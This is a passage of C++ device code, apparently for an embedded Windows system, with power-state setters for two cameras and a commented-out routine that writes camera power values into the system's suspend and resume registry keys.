	return TRUE;
}

BOOL DeviceCam::SetCam1PowerState()
{
	return SetCamPowerState(&hCam1, L"CAM1");
}

BOOL DeviceCam::SetCam2PowerState()
{
	return SetCamPowerState(&hCam2, L"CAM2");
}

VOID DeviceCam::SetRegPowerStatus(wstring camName)
{
/***
	LRESULT lr;
	HKEY hkResult = NULL;
	wstring wsBaseKeySuspend(L"System\\CurrentControlSet\\Control\\Power\\State\\Suspend");
	wstring wsBaseKeyResuming(L"System\\CurrentControlSet\\Control\\Power\\State\\Resuming");
	DWORD cbData = sizeof(DWORD), dwValue = 0;

	lr = RegOpenKeyExW(HKEY_LOCAL_MACHINE, wsBaseKeySuspend.c_str(), 0, KEY_WRITE , &hkResult);
	if (lr == ERROR_SUCCESS) {
		lr = RegSetValueEx(hkResult,
							camName.c_str(),
							0,
							REG_DWORD,
							(BYTE*) &dwValue,
							cbData);
		RegCloseKey(hkResult);
	}
		
	lr = RegOpenKeyExW(HKEY_LOCAL_MACHINE, wsBaseKeyResuming.c_str(), 0, KEY_WRITE , &hkResult);
	if (lr == ERROR_SUCCESS) {
		lr = RegSetValueEx(hkResult,
			camName.c_str(),
			0,
			REG_DWORD,
			(BYTE*) &dwValue,
			cbData);
		RegCloseKey(hkResult);
	}	
***/
}